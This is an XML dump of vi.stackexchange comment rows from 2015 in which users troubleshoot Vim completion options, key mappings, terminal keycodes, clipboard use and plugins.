  <row Id="6839" PostId="4550" Score="0" Text="This is indeed strange. Have you tried without your vimrc, and only with the debug script as your vimrc file ? `vim -u log.vim -N`" CreationDate="2015-08-28T08:35:13.893" UserId="1821" />
  <row Id="6840" PostId="4558" Score="1" Text="That's brilliant, I didn't know about this command. There's quite a long  delay between typing `&lt;C-O&gt;u` and seeing the result on the screen (about 4 seconds), any idea on how could I get rid of that?" CreationDate="2015-08-28T08:35:24.320" UserId="3079" />
  <row Id="6841" PostId="4568" Score="2" Text="+1 for Ctrl-P, such a great plugin." CreationDate="2015-08-28T08:39:12.520" UserId="3079" />
  <row Id="6842" PostId="4568" Score="0" Text="Yes, I recommend using `ag` with it : https://github.com/ggreer/the_silver_searcher" CreationDate="2015-08-28T08:42:36.230" UserId="1821" />
  <row Id="6843" PostId="4554" Score="1" Text="try replacing the first `&lt;` with `&lt;lt&gt;`, it solves a problem I had that may rely to this one" CreationDate="2015-08-28T08:54:08.460" UserId="1821" />
  <row Id="6844" PostId="4554" Score="2" Text="Or try ctl-v, ctl-f." CreationDate="2015-08-28T09:57:52.910" UserId="1430" />
  <row Id="6845" PostId="4562" Score="0" Text="Nice! I modified the post accordingly, even if its position is quite close to your comment :)" CreationDate="2015-08-28T10:04:54.217" UserId="1800" />
  <row Id="6846" PostId="4114" Score="0" Text="Yes some padding to align columns would be nice. I have found using feedkeys in the mapping makes it behave slightly better: `nmap &lt;silent&gt; &lt;Leader&gt;b :MBL&lt;CR&gt;:call feedkeys(':b ')&lt;CR&gt;`" CreationDate="2015-08-28T10:26:57.140" UserId="630" />
  <row Id="6847" PostId="4570" Score="0" Text="What's the result of `:verbose imap &lt;c-x&gt;&lt;c-l&gt;`? (should be &quot;no mapping found&quot;)" CreationDate="2015-08-28T11:37:19.430" UserId="1800" />
  <row Id="6848" PostId="4570" Score="0" Text="@VanLaser it says &quot;no mapping found&quot; so that is not the problem." CreationDate="2015-08-28T12:02:38.087" UserId="2792" />
  <row Id="6849" PostId="4570" Score="1" Text="Could you clarify what you *think* should happen when doing `&lt;C-x&gt;&lt;C-l&gt;` in insert mode? Also, what is the output of `:set complete?`?" CreationDate="2015-08-28T12:24:36.317" UserId="54" />
  <row Id="6850" PostId="4570" Score="0" Text="@VanLaser I think it should be `:verbose imap &lt;ctrl-x&gt;&lt;ctrl-l&gt;`" CreationDate="2015-08-28T12:27:35.393" UserId="1145" />
  <row Id="6852" PostId="4570" Score="0" Text="@romainl I was expecting what it said on this page under &quot;Example&quot;: http://vim.wikia.com/wiki/Line/word/file/whatever_completion and my completion settings are `],i,d`" CreationDate="2015-08-28T12:37:08.853" UserId="2792" />
  <row Id="6853" PostId="4570" Score="0" Text="Do you have any lines *actually written* in your buffer, or you delete them all before trying?" CreationDate="2015-08-28T12:53:48.430" UserId="1800" />
  <row Id="6854" PostId="4570" Score="1" Text="Ah, you're missing the `.` from the 'complete' option. The current buffer *isn't* scanned. See `:h 'complete'` (with the quotes). Just leave that option alone (don't set it yourself anywhere), or *add* to it." CreationDate="2015-08-28T13:09:10.783" UserId="1800" />
  <row Id="6855" PostId="4570" Score="0" Text="@VanLaser not exactly sure what you mean, but at first I tried using line completion while editing some code, so there were lots of lines. After that did not work I tried it on just 2-3 in a new file, but that also failed." CreationDate="2015-08-28T13:09:55.160" UserId="2792" />
  <row Id="6856" PostId="4570" Score="0" Text="@VanLaser yes that was it, thanks! so if you add your as an answer I will mark it as solved. Although reading the `:h 'complete'` it says that `i` option scans the current file, meaning that its not the buffer? (i.e. stuff not yet written to disk?)" CreationDate="2015-08-28T13:14:18.733" UserId="2792" />
  <row Id="6857" PostId="4570" Score="0" Text="It was @romainl the one who asked the right question. About `i` - try it and see how it works (save the file, then `&lt;c-x&gt;&lt;c-l&gt;`, without `b` complete flag set)." CreationDate="2015-08-28T13:20:01.103" UserId="1800" />
  <row Id="6858" PostId="4570" Score="0" Text="I… was about to write a proper answer but it was time for our weekly team meeting." CreationDate="2015-08-28T14:11:22.543" UserId="54" />
  <row Id="6859" PostId="4558" Score="0" Text="I noticed that, too. I don't know; I'll try to find out." CreationDate="2015-08-28T14:49:59.760" UserId="2055" />
  <row Id="6860" PostId="4562" Score="0" Text="@KarlYngveLervåg what is an 'ex' command?" CreationDate="2015-08-28T15:46:45.860" UserId="3344" />
  <row Id="6861" PostId="4566" Score="0" Text="One nice way would be to `:.!find . -type f -name &quot;patern&quot;` in an empty buffer and then use `gf` on each entry." CreationDate="2015-08-28T17:34:43.157" UserId="599" />
  <row Id="6862" PostId="4562" Score="1" Text="@user151841 Ex commands are commands you enter in command-line mode with `:`. See `:help cmdline.txt`." CreationDate="2015-08-28T17:58:02.877" UserId="21" />
  <row Id="6863" PostId="4562" Score="0" Text="@VanLaser I suppose `&gt;&gt;` is the normal command line concatenate? Then I could use `&gt;` to overwrite an existing file?" CreationDate="2015-08-28T18:05:19.690" UserId="3344" />
  <row Id="6864" PostId="4524" Score="0" Text="@Grégoire Please, let us continue this discussion in the [vimtex issue](https://github.com/lervag/vimtex/issues/219)." CreationDate="2015-08-28T18:22:45.327" UserId="21" />
  <row Id="6865" PostId="4562" Score="1" Text="@user151841 `&gt;&gt;` is used to *append* lines (concatenate, yes), and `!` to create the file if it doesn't exist. To overwrite a file instead, use `'&lt;,'&gt;write! the_other_file.txt` (without `&gt;&gt;`, and no, without a `&gt;` - it's not shell scripting). See `:h :w!` and `:h :write_a`." CreationDate="2015-08-28T19:36:31.557" UserId="1800" />
  <row Id="6866" PostId="4547" Score="0" Text="@HuStmpHrrr: Yes! That was it. `autowrite` was set. Thanks!" CreationDate="2015-08-28T21:39:59.347" UserId="3332" />
  <row Id="6867" PostId="4576" Score="0" Text="Sweet! I only need two arguments since the two blocks are contiguous and have the same size : `start` and `size`. With a homebrew function that retrieves those values from a selection, it'll just be perfect. I'm working on it. :)" CreationDate="2015-08-29T18:10:57.090" UserId="2978" />
  <row Id="6868" PostId="4579" Score="0" Text="+1 Great answer! ;-)" CreationDate="2015-08-29T18:57:32.133" UserId="1306" />
  <row Id="6869" PostId="4581" Score="0" Text="Aww, sweet! I Tried `vim &lt; echo &quot;test&quot;` but with no success. I did not know about `vim -`! And `+`/`-c` can be useful too. Thank you." CreationDate="2015-08-29T20:58:30.870" UserId="356" />
  <row Id="6870" PostId="4518" Score="0" Text="@romainl: I don't understand where you think I should try `&lt;ESC&gt;a` I don't want to use `a` in my mapping but `&lt;UP&gt;`" CreationDate="2015-08-29T21:18:04.380" UserId="1841" />
  <row Id="6871" PostId="4518" Score="0" Text="@VanLaser: That might be a good way but I have to say that I don't understand how keycodes works. I tried to remap `URxvt.keysym.Up` but all I could do was messing the behavior of my terminal." CreationDate="2015-08-29T21:32:30.397" UserId="1841" />
  <row Id="6872" PostId="4583" Score="1" Text="I got &quot;E16: Invalid range&quot; on the second command. I tried `.+,$d` instead, and that worked (as did `.+,.+4d`)." CreationDate="2015-08-29T21:50:16.567" UserId="2942" />
  <row Id="6873" PostId="4518" Score="0" Text="When you press `&lt;Up&gt;`, Vim doesn't receive `&lt;Up&gt;` but `&lt;Esc&gt;A` or some variant depending on your terminal emulator and/or `$TERM`. Either you map the actual escape sequence in Vim or you configure your terminal emulator so that it sends something that makes more sense." CreationDate="2015-08-29T21:53:49.373" UserId="54" />
  <row Id="6874" PostId="4518" Score="0" Text="@romainl: thanks I understand better now. I couldn't make it work by remapping in vim I'll have to find a solution to remap keys at a terminal level. Thanks for your comments." CreationDate="2015-08-29T22:13:12.747" UserId="1841" />
  <row Id="6876" PostId="4583" Score="0" Text="Not sure why this happens" CreationDate="2015-08-30T07:15:36.090" UserId="71" />
  <row Id="6877" PostId="4585" Score="1" Text="The default omni completion for CSS and HTML is already quite useful and you can only have one at a time so I would suggest using &quot;user-defined completion&quot; instead. See `:help i_ctrl-x_ctrl-u`." CreationDate="2015-08-30T08:53:13.577" UserId="54" />
  <row Id="6879" PostId="4518" Score="0" Text="@statox - you could even try to test/use other terminal emulator (e.g. termite)" CreationDate="2015-08-30T12:49:59.247" UserId="1800" />
  <row Id="6880" PostId="4583" Score="0" Text="Interesting. Unfortunately, this relies on the actual lines content, which is not what I need since they can contain anything ;)" CreationDate="2015-08-30T15:10:10.547" UserId="2978" />
  <row Id="6881" PostId="4582" Score="0" Text="Interesting. Unfortunately, this overwrites the content of marks and registers, which I may be using ;)" CreationDate="2015-08-30T15:11:26.510" UserId="2978" />
  <row Id="6882" PostId="4582" Score="0" Text="@lago-lito: indeed it overwrites marks and buffers. For marks I never use all 26 marks in my buffers so I dont't think that's really a problem. For buffers it might be more of a problem, I think you can often find an unused buffer or if you really can't, use a temporary variable and the functions `getreg()` and `setreg()` to save your buffer. But I agree that it is not an optimal solution :-)" CreationDate="2015-08-30T18:22:02.433" UserId="1841" />
  <row Id="6883" PostId="4585" Score="0" Text="@romainl: You're absolutely right, I'll see how to adapt my answer." CreationDate="2015-08-30T18:29:32.050" UserId="1841" />
  <row Id="6884" PostId="4583" Score="0" Text="no it doesn't. Read :h :range, you can always use direct numbering instead of a regex search" CreationDate="2015-08-30T18:37:13.883" UserId="71" />
  <row Id="6885" PostId="3363" Score="0" Text="Just created an account here at vi.stackexchange to thank you and upvote this wonderful answer of yours. Thank for relieving me thousand searches." CreationDate="2015-08-30T19:54:24.827" UserId="3359" />
  <row Id="6886" PostId="4518" Score="0" Text="@VanLaser: The quest for the ultimate terminal is never ending ;-) I've been using gnome-terminal for a long time (before realizing how bad it is) now I've been using urxvt for some months and excepted this problem I'm pretty satisfied with it so I will keep it for a while before changing." CreationDate="2015-08-30T20:19:13.423" UserId="1841" />
  <row Id="6887" PostId="4587" Score="1" Text="That is an interesting script. Might be useful. Thank you :)" CreationDate="2015-08-30T21:15:45.180" UserId="356" />
  <row Id="6888" PostId="4575" Score="0" Text="Now I'm curious - what's your use case? Are you block-renaming subtitles for a TV season?" CreationDate="2015-08-30T22:22:48.337" UserId="1800" />
  <row Id="6889" PostId="4572" Score="3" Text="http://www.emacswiki.org/pics/static/TabsSpacesBoth.png" CreationDate="2015-08-30T23:16:13.727" UserId="532" />
  <row Id="6890" PostId="4589" Score="0" Text="The tag stack is an history of the tags you visited. I don't think it would be of any use if some steps in that history were missing." CreationDate="2015-08-30T23:25:01.020" UserId="54" />
  <row Id="6891" PostId="4589" Score="0" Text="How do you use `:tags` to think that duplicates are a problem? The goal of this function is to help you seeing on which tag you are to let you navigate in your history with `&lt;C-t&gt;` and `:tag`, as romainl said if a step is missing the function becomes useless." CreationDate="2015-08-31T00:02:32.067" UserId="1841" />
  <row Id="6892" PostId="4589" Score="0" Text="I saw 2 identical lines in `:tags` output just close to each other. The causes confusion when navigating, since I pressed `&lt;c-t&gt;` but there is no back tracking ,and I have to press `&lt;c-t&gt;` again to do backtrack." CreationDate="2015-08-31T01:30:49.587" UserId="477" />
  <row Id="6894" PostId="3362" Score="0" Text="@AlexanderMyshov I use the position of the current view port relative to the desktop in the vim instance name; So I can either find the existing instance, or create one for the current view port." CreationDate="2015-08-31T05:35:26.440" UserId="925" />
  <row Id="6895" PostId="4575" Score="0" Text="@VanLaser Haha, I am not. Mostly, I am eye-parsing output from a program, which I need to check for consistency concerning order of creation / then delayed reading of objects. Interleaving blocks makes it easier to match corresponding lines in delayed output blocks. I also sometimes need to interleave lines of codes with repeated, similar instructions for logging or benchmarking. Generating those instructions is easy with macros, then interleaving them with actual code is now just a couple of keystrokes away with this function, which feels great :)" CreationDate="2015-08-31T07:33:37.240" UserId="2978" />
  <row Id="6896" PostId="4583" Score="0" Text="Oh, great! Then I guess the second trick wouldn't work anymore, but the first one is nice enough :)" CreationDate="2015-08-31T07:38:10.690" UserId="2978" />
  <row Id="6897" PostId="4589" Score="2" Text="That only means that you jumped to the same tag two times in a row. Anyway, Vim doesn't offer any way to manipulate the tag stack programmatically so you'd better get used to that behavior." CreationDate="2015-08-31T09:56:01.797" UserId="54" />
  <row Id="6898" PostId="4575" Score="1" Text="@lago-lito - thanks for the answer! Yes, Vim is quite versatile :) Your expression &quot;eye-parsing&quot; made me also think at `scroll-binding` two Vim windows." CreationDate="2015-08-31T11:10:01.320" UserId="1800" />
  <row Id="6899" PostId="4593" Score="2" Text="It could be a font problem. In this [question](http://vi.stackexchange.com/questions/3340/why-is-the-cursorline-always-showing-after-the-cursor-moves-over-a-line) changing the font size resolved a similar problem." CreationDate="2015-08-31T17:59:11.313" UserId="1453" />
  <row Id="6900" PostId="4594" Score="3" Text="Do you have screenshots? Can you give us more informations?" CreationDate="2015-09-01T05:59:16.843" UserId="54" />
  <row Id="6901" PostId="4595" Score="0" Text="You want what cCppString does, but not on cpp lines." CreationDate="2015-09-01T09:54:40.680" UserId="1430" />
  <row Id="6902" PostId="4595" Score="0" Text="I'm sorry what? could you elaborate?" CreationDate="2015-09-01T10:28:49.230" UserId="3023" />
  <row Id="6903" PostId="4595" Score="0" Text="The *simplest* way to solve it would be for you to add both the `&quot;` (start, end) from the beginning and write your text between the quotes. The problem of simply highlighting an incomplete string is that you *may* forget to add the final separator - Vim will show something which isn't true - a string which is ... not a string. A solution that solves both issues would be to highlight only the current line, but with a *different* color (as error? warning?) etc. - but then, perhaps you do have a quote on the next line, and Vim should look there too etc." CreationDate="2015-09-01T10:30:56.813" UserId="1800" />
  <row Id="6904" PostId="4594" Score="2" Text="Does this happen if you run MacVim without vimrc or gvimrc and immediately set a colorscheme? `mvim -u NONE -U NONE -c &quot;colo slate&quot;` (slate or some other other colorscheme bundled with MacVim)." CreationDate="2015-09-01T14:21:07.550" UserId="1306" />
  <row Id="6905" PostId="4542" Score="0" Text="Thanks for your invaluable efforts. I saw uniq function was not available in my vim 7.4. managed with ingo#compat#uniq. Still I could not. I get error when I did the same thing as per the video you had shared. &quot;E127: Cannot redefine function &lt;SNR&gt;23_ReloadSyntax: It is in use&quot;. i think, the script is fine, and now in my case(as per the example content in the question), its in the matter of selecting the keywords. i.e making your function,s:GetMatchingText(), to select only 00211005,00211004,00221007,00211001" CreationDate="2015-09-01T15:24:16.603" UserId="3323" />
  <row Id="6906" PostId="4542" Score="0" Text="You can do that with a visual selection :) since all your number are in the same columns you should be able to do it quickly : `&lt;C-V&gt;`" CreationDate="2015-09-01T15:29:26.203" UserId="1821" />
  <row Id="6908" PostId="3864" Score="2" Text="Why not use `&lt;C-u&gt;` instead of `&lt;C-o&gt;:left 0&lt;CR&gt;`?" CreationDate="2015-09-01T16:14:02.167" UserId="15" />
  <row Id="6909" PostId="3864" Score="0" Text="@jamessan This works as a &quot;backwards `J`&quot;: So `foo&lt;CR&gt;bar&lt;C-\&gt;` will leave you with `foobar`. IMHO it's more useful, but YMMV." CreationDate="2015-09-01T17:09:10.830" UserId="51" />
  <row Id="6910" PostId="3864" Score="0" Text="Right, but what I'm saying is that `&lt;C-u&gt;` (i.e., [i_CTRL-U](http://vimhelp.appspot.com/insert.txt.html#i_CTRL-U)) should be the same as `&lt;C-o&gt;:left 0&lt;CR&gt;`." CreationDate="2015-09-01T17:13:22.800" UserId="15" />
  <row Id="6911" PostId="3864" Score="1" Text="@jamessan Well, that depends on the cursor position. Typing `foo&lt;CR&gt;bar&lt;C-u&gt;` will leave you with `foo&lt;CR&gt;` (+ any auto-indent that Vim may have added). `&lt;C-o&gt;:left 0&lt;CR&gt;` will always behave the same regardless of the cursor position." CreationDate="2015-09-01T17:32:49.850" UserId="51" />
  <row Id="6912" PostId="3864" Score="0" Text="You could leave out the 0. Alternative mapping: `inoremap &lt;f5&gt; &lt;c-o&gt;^&lt;c-u&gt;&lt;bs&gt;`" CreationDate="2015-09-01T18:08:11.900" UserId="71" />
  <row Id="6913" PostId="4596" Score="0" Text="Or just use a plugin such as [delimtMate](https://github.com/Raimondi/delimitMate) or [auto-pairs](https://github.com/jiangmiao/auto-pairs) to close the quotes for you." CreationDate="2015-09-01T18:09:26.803" UserId="2313" />
  <row Id="6914" PostId="4598" Score="0" Text="Cool plugin! Just out of curiosity, I know that `&lt;Tmux-Leader&gt;q` will show tmux panes numbers like this plugin does for vim, is there a way to show both and easily switch between vim and tmux panes this way? (I don't think that [vim-tmux-navigator](https://github.com/christoomey/vim-tmux-navigator) allows it out of the box)" CreationDate="2015-09-01T21:56:29.253" UserId="1841" />
  <row Id="6915" PostId="4598" Score="1" Text="I'm not saying it's not doable, but ... somebody would probably have to glue portions of both plugins together, and add the `&lt;tmux-leader&gt;q` functionality in somewhere. All this IMHO - as I don't quite use tmux, because I can get by with more graphical tools (-&gt; `awesome window manager`)." CreationDate="2015-09-01T22:05:23.177" UserId="1800" />
  <row Id="6916" PostId="4598" Score="1" Text="I think you're right for the glueing of the two plugins, I was wondering if someone did it already. Also +1 for AWM :-)" CreationDate="2015-09-01T22:21:15.003" UserId="1841" />
  <row Id="6917" PostId="4596" Score="0" Text="I used to use such plugins but found them more annoying at most times than helpful where you just want to have the open brace/quote without its closed counterpart which you end up deleting." CreationDate="2015-09-01T23:39:51.630" UserId="3023" />
  <row Id="6918" PostId="4600" Score="0" Text="What is your exact problem? You seem to have the solution: select you text with visual mode (why would would use the mouse?) put it in the clipboard register with `&quot;+y` and in the other vim instance put the clipboard register `&quot;+p`. Or duplicate of [this](http://vi.stackexchange.com/questions/84/how-can-i-copy-text-to-the-system-clipboard-from-vim)?" CreationDate="2015-09-02T00:55:36.277" UserId="1841" />
  <row Id="6920" PostId="4600" Score="0" Text="You don't have to enter visual mode to yank something. You can follow `y` with a motion (`:help motion.txt`) or an object (`:help object-select`). If you yank and paste across Vim instances often, you may find that setting `clipboard` to include `unnamed` or `unnamedplus` useful. See `:help 'clipboard'`. Then copying between instances should just work." CreationDate="2015-09-02T02:14:20.077" UserId="2055" />
  <row Id="6921" PostId="4600" Score="1" Text="The point of my comment wasn't the visual mode, actually I have trouble to understand your problem: at first I thought it was the fact to copy some text from one terminal to another,  now it seems that it's about using as few keystrokes as possible to yank into the clipboard register. If that is the second case the comment of Garyjohn is relevant." CreationDate="2015-09-02T03:53:12.080" UserId="1841" />
  <row Id="6922" PostId="4602" Score="1" Text="`:-1put =foldbegin`&#xA;Full command is `:[line]put [x]` where [line] is line number by default is current line `-1`." CreationDate="2015-09-02T06:51:20.910" UserId="1145" />
  <row Id="6923" PostId="4598" Score="0" Text="So - Yes, I don't know of any plugin that would combine the two functionalities." CreationDate="2015-09-02T08:11:09.753" UserId="1800" />
  <row Id="6924" PostId="3671" Score="0" Text="When this happens to me in ViM... `:set buftype=`" CreationDate="2015-09-02T04:41:17.923" UserId="3384" />
  <row Id="6925" PostId="4602" Score="0" Text="Thanks. So obvious now." CreationDate="2015-09-02T08:41:29.343" UserId="1313" />
  <row Id="6926" PostId="4542" Score="0" Text="Excellent.! Worked fine. Actually the error, &quot;E127: Cannot redefine function&quot;, was since, i had kept the .vim/plugin/syntaxreload.vim at .vim/syntax/syntaxreload.vim.Thanks." CreationDate="2015-09-02T09:02:10.133" UserId="3323" />
  <row Id="6927" PostId="4542" Score="0" Text="Great it worked :) I recommend using https://github.com/junegunn/vim-plug with https://github.com/tpope/vim-scriptease to develop vim plugin, you should give it a try :)" CreationDate="2015-09-02T09:06:51.697" UserId="1821" />
  <row Id="6928" PostId="4600" Score="1" Text="`0v$` is the same as `V`. And it's easy to make a mapping for `&quot;+y`: `:nnoremap &lt;Leader&gt;y &quot;+y`. So that reduces it to `V\y`." CreationDate="2015-09-02T09:18:49.550" UserId="51" />
  <row Id="6929" PostId="4607" Score="0" Text="Do you know a usecase where the `expr-quote` is a better use than a `literal-string` ?" CreationDate="2015-09-02T09:37:50.907" UserId="1821" />
  <row Id="6930" PostId="4607" Score="0" Text="When you need keys like in `:exe &quot;:norm! afoobar\&lt;esc&gt;&quot;` or when you need special chars e.g. \xe4" CreationDate="2015-09-02T12:09:05.123" UserId="71" />
  <row Id="6931" PostId="4607" Score="0" Text="I see, meanwhile I found http://google.github.io/styleguide/vimscriptguide.xml where this is explained also :)" CreationDate="2015-09-02T12:11:30.637" UserId="1821" />
  <row Id="6932" PostId="4600" Score="0" Text="@Carpetsmoker your solution is good. I'd like to take it as the optimal solution if you paste it to the answer region. It seems that without key map, the best we can do for the copy in my question is `V&quot;+y`, 4 keystrokes." CreationDate="2015-09-02T13:05:15.163" UserId="1080" />
  <row Id="6933" PostId="4612" Score="0" Text="While I didn't found any function, you could create one that paste the text into a buffer, operate over it (there you can `gq`) and copying it afterward." CreationDate="2015-09-02T14:01:40.843" UserId="1821" />
  <row Id="6934" PostId="4612" Score="0" Text="I was thinking of that, too, but I am going this route only as last resort." CreationDate="2015-09-02T14:03:02.793" UserId="985" />
  <row Id="6935" PostId="4613" Score="2" Text="Try `:echo 42/0.0` to see another result :)" CreationDate="2015-09-02T14:13:34.397" UserId="1800" />
  <row Id="6936" PostId="2135" Score="0" Text="@MattBoehm: can you make an answer of your comments ? So the question can be marked as resolved :)" CreationDate="2015-09-02T15:17:55.707" UserId="1821" />
  <row Id="6937" PostId="2135" Score="0" Text="@Nobe4 done, thanks." CreationDate="2015-09-02T15:26:41.023" UserId="680" />
  <row Id="6938" PostId="4616" Score="1" Text="Can you explain what does the `G:a&lt;CR&gt;.` does ? because it does nothing in my vim, except to go to the last line ..." CreationDate="2015-09-02T17:28:35.713" UserId="1821" />
  <row Id="6939" PostId="4616" Score="0" Text="@Nobe4 - Yes, it goes to the last line. Then we insert a blank line at the bottom of the file by pressing enter and the period key. There are TWO &lt;CR&gt; one after the a and then again to insert the space." CreationDate="2015-09-02T17:31:01.810" UserId="1417" />
  <row Id="6940" PostId="4616" Score="0" Text="OK, can you add this detail into your question, and maybe use the `&lt;S-g&gt;` notation, or the &lt;kbd&gt;.&lt;/kbd&gt; one :)" CreationDate="2015-09-02T17:32:52.960" UserId="1821" />
  <row Id="6941" PostId="4618" Score="0" Text="`substitute()` acts on a string - are you looking for a `global()` function that acts on a string? If not, you are not looking for a `:g` equivalent in the same way `substitute()` is associated with `:substitute`." CreationDate="2015-09-02T18:30:18.367" UserId="1800" />
  <row Id="6942" PostId="4618" Score="0" Text="I don't know exactly what you're looking for, but `:help function-list` will show you all the built-in functions with short descriptions and should help you find something that meets your needs. Also, it's common in scripts to put a while loop around a call to search() and then perform the desired editing operation (e.g., substitute()) on the lines found." CreationDate="2015-09-02T18:31:29.880" UserId="2055" />
  <row Id="6943" PostId="4618" Score="0" Text="@VanLaser : yes exactly" CreationDate="2015-09-02T20:17:54.983" UserId="1821" />
  <row Id="6944" PostId="4618" Score="0" Text="@garyjohn : I know, that is where I searched for it" CreationDate="2015-09-02T20:18:28.787" UserId="1821" />
  <row Id="6945" PostId="4614" Score="0" Text="In that case, why is division of a negative number by 0 not the minimum number? -&gt; http://vi.stackexchange.com/questions/4623/why-is-division-of-a-negative-number-by-0-not-the-minimum-number" CreationDate="2015-09-02T21:51:51.543" UserId="945" />
  <row Id="6946" PostId="4625" Score="0" Text="I heard of this plugin before but never tried it I'll give it a try thanks! Also the second suggestion is nice but doesn't allow to do the second type of search i.e. which keys are mapped to execute this function." CreationDate="2015-09-02T22:27:50.133" UserId="1841" />
  <row Id="6947" PostId="4626" Score="0" Text="That's a great way to do it thanks but as for VanLaser answer I stil have a question: this doesn't allow me to make a search on `MyFunction` to know which keys are mapped to call it." CreationDate="2015-09-02T22:29:26.800" UserId="1841" />
  <row Id="6948" PostId="4625" Score="0" Text="Indeed - you can do that with the 1st suggestion. And 'Unite' (and its extensions) = the Swiss knife of Vim plugins :)" CreationDate="2015-09-02T22:47:38.567" UserId="1800" />
  <row Id="6949" PostId="4625" Score="1" Text="Ok I'll look at it closely then thank you very much!" CreationDate="2015-09-02T22:50:53.643" UserId="1841" />
  <row Id="6950" PostId="4629" Score="0" Text="can you try http://vi.stackexchange.com/a/2004/1821 and le us know if this issues is related to your vimrc ?" CreationDate="2015-09-03T05:40:37.453" UserId="1821" />
  <row Id="6951" PostId="4614" Score="0" Text="I've edited my question" CreationDate="2015-09-03T06:30:34.517" UserId="1821" />
  <row Id="6952" PostId="4624" Score="0" Text="See my edition on the linked question :) : `-2147483648` is used for representing `NaN`" CreationDate="2015-09-03T06:31:09.067" UserId="1821" />
  <row Id="6953" PostId="4629" Score="0" Text="Does it happen with another font? One that has italic and bold also installed." CreationDate="2015-09-03T08:10:31.650" UserId="1800" />
  <row Id="6954" PostId="4619" Score="1" Text="Why so ? Can you add details for your answer please ?" CreationDate="2015-09-03T08:55:18.450" UserId="1821" />
  <row Id="6955" PostId="3743" Score="0" Text="You can use `:echo synIDattr(synIDtrans(hlID('Comment')), 'bold', 'gui')` to check for bold mode for gui. See the help at `:h synIDattr` for all the arguments." CreationDate="2015-09-03T09:24:37.610" UserId="71" />
  <row Id="6956" PostId="4631" Score="0" Text="Would you please add a specific example of a command you're trying to run and where it's failing to the question?  Thanks!" CreationDate="2015-09-03T09:34:20.607" UserId="1430" />
  <row Id="6957" PostId="4619" Score="1" Text="VimL function work with datatypes and do not handle the current buffer. Therefore wrapping makes no sense for an string datatype. If you want to wrap in VimScript, use the existing normal mode commands." CreationDate="2015-09-03T10:36:03.827" UserId="71" />
  <row Id="6958" PostId="4634" Score="1" Text="You should start looking at the `-w` flag when you start vim. You can record every keystrokes with it." CreationDate="2015-09-03T13:10:18.303" UserId="1821" />
  <row Id="6959" PostId="4634" Score="4" Text="Related blog post ([link](http://www.drbunsen.org/vim-croquet/)). It shows you how to record your input (`vim -w file.log`) and provides a haskell script to parse the file into separate commands which you can then analyse. No timestamps though." CreationDate="2015-09-03T13:10:35.663" UserId="20" />
  <row Id="6960" PostId="4634" Score="0" Text="Thank you @Nobe4 this looks usefull and almost I was looking for. I still wonder if the time is somehow collectible. Maybe not timestamps, but time diffs between the keystrokes. This could help with finding out the speed of how things go." CreationDate="2015-09-03T13:23:15.807" UserId="3405" />
  <row Id="6961" PostId="4634" Score="0" Text="Actually that was a question for both of you. It just didn't allow me to specify to mentions in one comment." CreationDate="2015-09-03T13:48:05.633" UserId="3405" />
  <row Id="6962" PostId="4634" Score="0" Text="Here is an idea how to capture the timestamp: Use the following [script](https://gist.github.com/tokoyami/b09ac94e556b2a1f0932) and call vim like this: `vim -w &lt;(./test-io.py &gt; log)` (`vim -w &lt;(tee raw-log | ./test-io.py &gt; log)` if you want the raw output, too) (***nix only**). This should write all your input with timestamps, one byte per row, in `log`. What I have noticed is that vim doesn't output the commands one by one but flushes them." CreationDate="2015-09-03T14:00:49.693" UserId="20" />
  <row Id="6963" PostId="4634" Score="0" Text="I got a typo in my previous comment. It's `&gt;()` not `&lt;()`. We want to write not read the file." CreationDate="2015-09-03T14:09:36.833" UserId="20" />
  <row Id="6964" PostId="4634" Score="0" Text="Thank you very much. Could you please reply and i'll accept the answer? It seems like enough info for what i want to do." CreationDate="2015-09-03T14:14:18.980" UserId="3405" />
  <row Id="6965" PostId="4629" Score="0" Text="Well I commented out the lines I was suspicious about and used another font &quot;Input Mono&quot;, earlier I was using &quot;Courier_New&quot;. So far it's not happening, and scrolling is a bit faster BUT there is this common jitter/flicker that happens when I scroll via C-y/C-e (single line scroll) and not page up/down." CreationDate="2015-09-03T14:32:03.303" UserId="3023" />
  <row Id="6967" PostId="4623" Score="0" Text="@Nobe4's answer on the linked question is more than sufficient to answer this question, so this question is now a duplicate." CreationDate="2015-09-03T14:42:46.247" UserId="945" />
  <row Id="6968" PostId="4624" Score="0" Text="@statox: this answer does not explain why -X/0 is -2147483647 instead of -2147483648." CreationDate="2015-09-03T14:44:05.683" UserId="945" />
  <row Id="6969" PostId="4635" Score="0" Text="Yeah. I wonder if I could raise a neovim issue for this. Maybe guys are interested in providing this feature. Or I could dive head first and try to patch it myself if permitted, though i probably won't have the time." CreationDate="2015-09-03T15:31:20.887" UserId="3405" />
  <row Id="6970" PostId="4629" Score="0" Text="Try also to enable directx rendering: https://www.reddit.com/r/vim/comments/3j6wbv/starting_to_use_vim_at_work_and_home_but_i_have/cuna9h0" CreationDate="2015-09-03T18:20:13.043" UserId="1800" />
  <row Id="6971" PostId="4629" Score="0" Text="Not sure that line is getting executed. The if is executed if my vim version is higher than 704 (which it isn't) or of if is 704 (true) and has patch393 (false). Setting the render mode directly without those if checks vim errors out, &quot;Unknown command&quot;. `:h renderoptions` shows no help for renderoptions." CreationDate="2015-09-03T18:32:12.340" UserId="3023" />
  <row Id="6972" PostId="4633" Score="0" Text="This works for me. I am wondering why it works." CreationDate="2015-09-03T22:01:51.080" UserId="477" />
  <row Id="6973" PostId="4635" Score="0" Text="@6D65 I think you can suggest to the neovim project an input debug log feature where every input from the user is shown with a timestamp. I've seen them often temporarily patching code to try and debug `:terminal` issues related to input so it should be an useful feature. I'm not familiar with the remote plugin API they have, but that might also have some way to get the input in real time." CreationDate="2015-09-04T06:34:55.607" UserId="20" />
  <row Id="6974" PostId="4629" Score="0" Text="You *could* install a more recent Vim ..." CreationDate="2015-09-04T08:38:13.267" UserId="1800" />
  <row Id="6975" PostId="4638" Score="0" Text="Haha! This has actually been my hack so far =D. Is there not an &quot;canonical&quot; way of doing so? (also *faster*)" CreationDate="2015-09-04T08:56:54.477" UserId="2978" />
  <row Id="6976" PostId="4637" Score="0" Text="What's your use case for this? I'm really just curious :)" CreationDate="2015-09-04T09:19:41.220" UserId="1296" />
  <row Id="6977" PostId="4638" Score="0" Text="I don't know of one, but I don't use macros too much (I prefer writing small functions instead). Macros feel to cryptic for me, when I look at them afterwards." CreationDate="2015-09-04T09:23:23.383" UserId="1800" />
